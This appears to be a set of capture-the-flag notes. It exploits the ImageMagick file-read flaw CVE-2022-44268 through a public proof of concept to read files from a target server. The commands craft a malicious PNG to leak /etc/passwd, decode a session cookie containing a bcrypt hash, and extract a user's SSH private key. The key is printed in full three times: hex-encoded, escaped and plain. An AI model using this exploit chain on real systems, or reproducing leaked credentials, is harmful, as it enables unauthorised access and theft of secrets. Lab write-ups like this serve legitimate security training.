In backup we find the zip ImageMagick.zip. After searching a bit around i found that there is a metasploit module in order to get remote code execution, so let us use that


```bash
git clone https://github.com/voidz0r/CVE-2022-44268

```

```bash
cargo run "/etc/passwd"
```

upload and get 

```bash
identify -verbose image.png
```


```txt
# for line in $(cat file) ; do line="\"$line\"";  python3 -c "print(bytes.fromhex($line))"; done
b'root:x:0:0:root:/root:/bin/bash\ndaem'
b'on:x:1:1:daemon:/usr/sbin:/usr/sbin/'
b'nologin\nbin:x:2:2:bin:/bin:/usr/sbin'
b'/nologin\nsys:x:3:3:sys:/dev:/usr/sbi'
b'n/nologin\nsync:x:4:65534:sync:/bin:/'
b'bin/sync\ngames:x:5:60:games:/usr/gam'
b'es:/usr/sbin/nologin\nman:x:6:12:man:'
b'/var/cache/man:/usr/sbin/nologin\nlp:'
b'x:7:7:lp:/var/spool/lpd:/usr/sbin/no'
b'login\nmail:x:8:8:mail:/var/mail:/usr'
b'/sbin/nologin\nnews:x:9:9:news:/var/s'
b'pool/news:/usr/sbin/nologin\nuucp:x:1'
b'0:10:uucp:/var/spool/uucp:/usr/sbin/'
b'nologin\nproxy:x:13:13:proxy:/bin:/us'
b'r/sbin/nologin\nwww-data:x:33:33:www-'
b'data:/var/www:/usr/sbin/nologin\nback'
b'up:x:34:34:backup:/var/backups:/usr/'
b'sbin/nologin\nlist:x:38:38:Mailing Li'
b'st Manager:/var/list:/usr/sbin/nolog'
b'in\nirc:x:39:39:ircd:/run/ircd:/usr/s'
b'bin/nologin\ngnats:x:41:41:Gnats Bug-'
b'Reporting System (admin):/var/lib/gn'
b'ats:/usr/sbin/nologin\nnobody:x:65534'
b':65534:nobody:/nonexistent:/usr/sbin'
b'/nologin\n_apt:x:100:65534::/nonexist'
b'ent:/usr/sbin/nologin\nsystemd-networ'
b'k:x:101:103:systemd Network Manageme'
b'nt,,,:/run/systemd:/usr/sbin/nologin'
b'\nsystemd-resolve:x:102:104:systemd R'
b'esolver,,,:/run/systemd:/usr/sbin/no'
b'login\nmessagebus:x:103:106::/nonexis'
b'tent:/usr/sbin/nologin\nsystemd-times'
b'ync:x:104:107:systemd Time Synchroni'
b'zation,,,:/run/systemd:/usr/sbin/nol'
b'ogin\nDebian-exim:x:105:108::/var/spo'
b'ol/exim4:/usr/sbin/nologin\nsshd:x:10'
b'6:65534::/run/sshd:/usr/sbin/nologin'
b'\nemp:x:1000:1000::/home/emp:/bin/bas'
b'h\n'

```

**emp** is a user 

by trying the cookie thing 

```bash
$ echo 'W1s3XSwiJDJhJDEyJDNwZC94OHl0bjhaWUtQTm5ibW4uR2UiLCIxNzE2NTcyMjc3LjkwNTcyMyJd' | base64 --decode 
[[7],"$2a$12$3pd/x8ytn8ZYKPNnbmn.Ge","1716572277.905723"](base)
```

Do the same for /home/emp/.ssh/id_rsa

```txt
3381
2d2d2d2d2d424547494e204f50454e5353482050524956415445204b45592d2d2d2d2d0a
6233426c626e4e7a614331725a586b74646a45414141414142473576626d554141414145
626d39755a514141414141414141414241414143467741414141647a63326774636e0a4e
684141414141774541415141414167454133676c46704f47302b6b4f654f59436e36524f
52654e674a7038556d6d45526438526542436e3439514b667875513643637a65360a7464
77524f4c6334764a4a4a4b78414c484d5a5762656e614671585257466a73353351387336
506c4e2f413637516b452b506253655a397432732f65535251476f6c484e6d550a4a6d38
49474a4b4e63676e3636444d6b6d30796d706f7133493138466b4a7553482f4e4a56426e
3654304d554453754c7962516b79525366584c796f756a306c786e667835410a6e524a49
4b3063716967344c463641636d5942445275784b6e48545961452b52386368432b307655
465554345746686c485661794877667662597072464f644f6e5a553363350a5368485362
6f79614d6c7453555278494c49595a42364d754673495a47784358634b4a5545477a704f
583058556a69794c577848776448676b463067446f5244333547576d490a6c6e77784151
42514879524e312b7a55423433706732336c704e553841744e2b4a597a6f496d4c4f435a
6539546e6158696a52594e76545357573659326b636f764469794f4e0a2b58646c78326d
7a48724f7a766946493972724349445738616b7434735553764e2b2b6453336f78395a4b
64537a4b4747452f566b687435645547387039475974486259466c0a71586743486b636a
6c5971564b4f655a4b7676592b466476584f7a704566586d4a7266616e6341784479684e
614f38726c77596f7a715559716d6e6265673049555774694b330a6e6f77505a74497045
434c3972365758783965515063557a3074666b53392f5141544a42446e41496636303946
6e644761344f564276716b6b414637522f585846574d5968380a657a4c6d4f67304c3653
33415255556d6243356e3149536d4e745976395268654d524444302f3165534c4b487552
4e6c6a5175534d6c753839454a546e6f462b386a396667440a6341414164494f57307539
546c744c7655414141414863334e6f4c584a7a595141414167454133676c46704f47302b
6b4f654f59436e36524f52654e674a7038556d6d4552640a38526542436e3439514b6678
75513643637a6536746477524f4c6334764a4a4a4b78414c484d5a5762656e6146715852
57466a73353351387336506c4e2f413637516b452b500a6253655a397432732f65535251
476f6c484e6d554a6d3849474a4b4e63676e3636444d6b6d30796d706f7133493138466b
4a7553482f4e4a56426e3654304d554453754c79620a516b79525366584c796f756a306c
786e667835416e524a494b3063716967344c463641636d5942445275784b6e4854596145
2b52386368432b307655465554345746686c48560a61794877667662597072464f644f6e
5a5533633553684853626f79614d6c7453555278494c49595a42364d754673495a477843
58634b4a5545477a704f583058556a69794c570a7848776448676b463067446f52443335
47576d496c6e7778415142514879524e312b7a55423433706732336c704e553841744e2b
4a597a6f496d4c4f435a6539546e6158696a0a52594e76545357573659326b636f764469
794f4e2b58646c78326d7a48724f7a766946493972724349445738616b7434735553764e
2b2b6453336f78395a4b64537a4b4747450a2f566b687435645547387039475974486259
466c71586743486b636a6c5971564b4f655a4b7676592b466476584f7a704566586d4a72
66616e6341784479684e614f38726c770a596f7a715559716d6e6265673049555774694b
336e6f77505a74497045434c3972365758783965515063557a3074666b53392f5141544a
42446e414966363039466e644761340a4f564276716b6b414637522f585846574d596838
657a4c6d4f67304c365333415255556d6243356e3149536d4e745976395268654d524444
302f3165534c4b4875524e6c6a510a75534d6c753839454a546e6f462b386a3966674463
41414141444151414241414143414532445553505a67394f6d6a584d6e6e666135565279
703174305237344a53773754700a3771756148496f5931304d7964496f436c3554726162
75794177575a3042395062344778482f5570495843736e4b504b44354a527575732f7555
4c4a41396c435039456d595a0a344238566a6c486f58476a765a56746e2f64645a426175
475a67693877544955774a2f53703438576541374b476d67385630762b4938685064566e
385965436a4a68375a57380a6f792f3974684a556f33464a76767661744e58677a763845
7a6933353778646c5676616a6c316b494870663246714a37764d68366b422b6f666a6161
714651334c37324a53590a2b5a747055344d462f517a466f7041483343456d6a5a373453
4e42786e784166336e5a6b72684a44666c43466e4477646b3744486971396452694a4373
45534d3947373145530a767875414c4e372b5942654b7877352f45436277336936715445
3263594a792b316e4c682f47636f473032784d51516e377661583935486e567745354345
48796d2f6d3839500a54657a394a74382b556b476875314772483161717a52693365444a
566761446e3772684f38394b77766556416869552f556776625564327a70316e766a3353
7147726c6a75560a4236654c5a73304e6636367537643830526673746270524a6e414656
366967322b6f737437316a364d5135675832393839472b77594843772b70453041553977
6d786b444f360a53447455435a6d4769723766364939432b725644654667576855594e78
4f384f356b683230614a51676c6f555548475247594c4534665032374d6a6a7041674531
566f6679470a4b665a57457a5467687258687269777378684f6c2b494a5a4f38552f4177
78564945537031474a302b6a717261587078395a574531545252686e6a4c75673946456e
697852330a71494b527034386c66474150447750374b5a4141414241434b75624e344252
444e706655636d2b686a4753494744366b69383548714e62304d5561494279516d616943
7043370a35696b484a39476b65676751557373445158346876616d777233656550416e67
6c6e715056673965476666473053322f6f5875634d756e504b78746f63517a6b6b32625a
62470a4f51586b30316a416f56395a543875593451554b5875672f54754e726666416b46
4e6f6451304a4c4a54517049637270492f6e757355594e3557792b727a702f4d4d7a7a46
330a56616a2b4d4f5754456862447467754171643437554f5751786c34612b5756726e52
704358315a634566697055506c7a7238576b3856496a5038423245473035367243724643
0a757273572f414a39564e31673874325543706a766763737a4d51714558416b3974764d
38556b65392f6e784a6a655258766f595965454458454265436e7557746645727037580a
2f756e396a6369507868474f514351414141454241504e45792b6e686c5066532f476e4b
31724f524a72366139446745345065657a5961387670306b577839334130504833430a47
34656b6b346a6234575353596d6639346c59784e527247302b464f335971572b48626f76
4e4d6c2b507359793152696a426e7a634652566d653176446d6f444a6b4e41754e0a794b
544b55513461345245553063586c322b68755a53445349416a5757454c387474716c5642
727033373868706e53584a6c336673476263382f305241584a564e75395a33330a365755
626c635a55467a78494a5365766b36774844494537496c45694d573167392f304b5a7a34
6f6441366452455277446c616d794731647962686e774973516d4a6f64544c0a31766b61
344d2f77767073616f722b65486f313167334d70717333376c6f562f48654a4a385a6d66
4d6778664a64754b7248537a586b546a347467747834453542746f2b6f540a7a39464671
74596d6554444f734141414542414f6d6f41773457354f2b682f54396e495449427a732f
48384e775156724f6c76744c385741464f6e516445427872542b3948370a456c4f355366
7259586e394969324d5263496430314f2f75374344476e6b6945716b54567845594c5165
4857706b4b3478633841595650364c6973325a426a52636c367173580a33355268496868
70414f795833744846586462537744683042314833503251723774784566794245634a70
4d6c6d514d7848457534326a764e5a33544a4c45795635476979750a7854564f75357052
32494b6f2b387641694c5741566d6e497961655941674d766958777a7049666d35554937
683978713152654a57734e706566384f79396a7963704b6b35570a5751593574586e7435
47476a3473374d377438734c6755326c586754445155556e6d76664e6c6f505759547a6b
574c366b4b5a744649526c7561517a4c315059774a734f36640a57554c2f46332f365675
554141414152636d39766445417a4e6d45774e4759794e324577596a554241673d3d0a2d
2d2d2d2d454e44204f50454e5353482050524956415445204b45592d2d2d2d2d0a
```


```txt

-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n
```


```txt
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

now we are inside the [[COMPUTER_ithink]]
